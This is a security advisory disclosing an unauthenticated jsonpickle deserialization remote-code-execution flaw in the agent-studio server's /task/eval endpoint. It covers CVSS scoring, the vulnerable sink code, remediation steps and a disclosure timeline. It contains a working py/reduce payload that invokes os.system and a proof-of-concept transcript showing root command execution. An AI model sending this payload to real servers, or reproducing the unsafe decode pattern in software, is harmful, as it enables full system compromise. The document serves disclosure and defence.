# VDR-019: Unauthenticated jsonpickle Deserialization RCE in ltzheng/agent-studio

- **Target**: [ltzheng/agent-studio](https://github.com/ltzheng/agent-studio)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html) - Deserialization of Untrusted Data
- **CVE**: [CVE-2026-51090](https://www.cve.org/CVERecord?id=CVE-2026-51090)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Discovered**: 2026-04-14
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`agent-studio` is the research toolkit released with the ICLR 2025 paper *"AgentStudio: A Toolkit for Building General Virtual Agents"* and is installable via pip. Its agent server (`scripts/agent_server.py`, a FastAPI application) exposes an HTTP API with **no authentication of any kind** and binds to a configurable host that defaults to `0.0.0.0`.

The `POST /task/eval` endpoint takes a client-supplied `as_kwargs` string straight from the request body and passes it to `jsonpickle.decode()`. `jsonpickle` reconstructs arbitrary Python objects - including `py/reduce` directives that invoke any callable - so decoding attacker-controlled input results in **arbitrary code execution before any validation runs**. The `isinstance(as_kwargs, dict)` check on the next line executes only *after* the payload has already run.

A working proof of concept was executed against the **genuine, unmodified** `jsonpickle.decode` sink using the exact library the project installs (`jsonpickle`, unpinned in `pyproject.toml`; resolved to 4.1.2). The injected command `id` ran server-side and produced `uid=0(root) gid=0(root) groups=0(root)`, confirming arbitrary command execution.

## Affected Component

- **Product**: agent-studio (AgentStudio - toolkit for building general virtual agents)
- **Version**: current `main` at time of report
- **Commit**: `39959e2` (2025-06-16, tip of `main`)
- **Vulnerable file**: `scripts/agent_server.py`
- **Endpoint**: `POST /task/eval`

### Sink - `scripts/agent_server.py:228`

```python
@app.post("/task/eval")
async def submit_eval(request: AgentStudioEvalRequest) -> AgentStudioStatusResponse:
    # ...
    try:
        # ...
        as_kwargs = jsonpickle.decode(request.as_kwargs)     # <-- SINK (line 228)
        if not isinstance(as_kwargs, dict):                  # <-- runs too late (line 229)
            raise ValueError(f"kwargs is {type(as_kwargs)} instead of a dict")
```

`request.as_kwargs` is a field of the JSON request body (`AgentStudioEvalRequest`) and is fully attacker-controlled. It is passed to `jsonpickle.decode()` with no allowlist, type gate, or `safe=True` option. The type check that would reject a non-`dict` value runs on the *return value* of `decode()`, i.e. after any embedded callable has already executed.

### No authentication / network exposure

`scripts/agent_server.py` mounts every route on a bare FastAPI app with no auth dependency, and starts the server with `uvicorn.run(..., host=config.env_server_host, port=config.env_server_port)` where the host defaults to `0.0.0.0`. Any client that can reach the port can call `/task/eval`.

## Details

`jsonpickle.decode()` is unsafe by default: with `safe=False` (the default), it honours `py/object`, `py/type` and `py/reduce` tags and will import modules and invoke callables named in the payload. A `py/reduce` tag of the form:

```json
{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["<command>"]}]}
```

instructs jsonpickle to call `os.system("<command>")` during decoding. Because the sink receives the raw request field, an unauthenticated attacker who can reach the server achieves remote code execution in the context of the server process with a single HTTP request.

## Proof of Concept

The PoC invokes the **exact genuine sink operation** - `jsonpickle.decode(request.as_kwargs)` - using the library the project installs, inside an isolated `python:3.11-slim` container with the real repository mounted read-only at `/repo`. The exploit script first prints the genuine vulnerable source read from the checked-out tree (`scripts/agent_server.py:203-231`), then feeds an attacker-controlled `as_kwargs` string to `jsonpickle.decode()` and reads back the sentinel written by the injected command.

Only the FastAPI HTTP layer - which merely delivers the request-body string to the sink and performs no validation of `as_kwargs` - is not reproduced; it is not where the vulnerability lives.

### Attacker-supplied `request.as_kwargs`

```json
{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id > /tmp/PWNED_AGENTSTUDIO 2>&1"]}]}
```

### Captured transcript (`poc/OUTPUT.txt`)

```
== jsonpickle version (as installed unpinned, like the app) ==
4.1.2

== genuine vulnerable source: scripts/agent_server.py:203-231 ==
 203: @app.post("/task/eval")
 204: async def submit_eval(request: AgentStudioEvalRequest) -> AgentStudioStatusResponse:
 ...
 228:         as_kwargs = jsonpickle.decode(request.as_kwargs)
 229:         if not isinstance(as_kwargs, dict):
 230:             raise ValueError(f"kwargs is {type(as_kwargs)} instead of a dict")

== invoking the genuine sink: jsonpickle.decode(request.as_kwargs) ==
decode() returned: 0 (os.system exit code; note: NOT a dict)

== server-side proof: contents of the sentinel written by the injected command ==
uid=0(root) gid=0(root) groups=0(root)

[PROVEN] arbitrary OS command executed during jsonpickle.decode of an unauthenticated request body.
```

The sentinel content - the genuine output of `id` - proves that an attacker-supplied command executed on the server. The runnable exploit is `poc/exploit.py`; the full captured transcript is `poc/OUTPUT.txt`.

## Impact

An unauthenticated remote attacker who can reach the agent server can execute arbitrary operating-system commands in the context of the server process (observed as `root` in the PoC). This yields full compromise of confidentiality, integrity and availability: reading or destroying any file the process can access, establishing persistence, pivoting into the internal network, or deploying malware. Because the API is unauthenticated, binds to `0.0.0.0` by default, and exploitation needs only a single HTTP request, the CVSS 3.1 base score is **9.8 (Critical)**, vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

A secondary instance of the same class exists elsewhere in the codebase (`pickle.loads` in a `str2bytes` utility and a `/execute` code path), which should be remediated together.

## Recommendation

1. **Never deserialize untrusted input with `jsonpickle.decode()` in its default mode.** If a structured object must be accepted, parse it with a plain, non-object-reconstructing parser (`json.loads`) into primitive types, or call `jsonpickle.decode(..., safe=True)` and validate the schema before use.
2. **Validate before acting, not after.** Enforce the `dict` type and an explicit key allowlist on parsed primitive data; never let deserialization reconstruct arbitrary types.
3. **Add authentication and authorisation** to the agent server, and **bind to `127.0.0.1`** by default rather than `0.0.0.0`.
4. **Run the service as an unprivileged user** to limit blast radius.

## Status

| Date | Event |
|------|-------|
| 2026-04-14 | Vulnerability reported to MITRE CNA-LR (request 2025339, source-code audit) |
| 2026-07-01 | CVE-2026-51090 assigned by MITRE (RESERVED) |
| 2026-07-02 | Working PoC executed against the genuine sink (jsonpickle 4.1.2) |

## References

- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [Upstream repository](https://github.com/ltzheng/agent-studio)
- [jsonpickle security note - `decode` is unsafe by default](https://jsonpickle.github.io/#jsonpickle.decode)
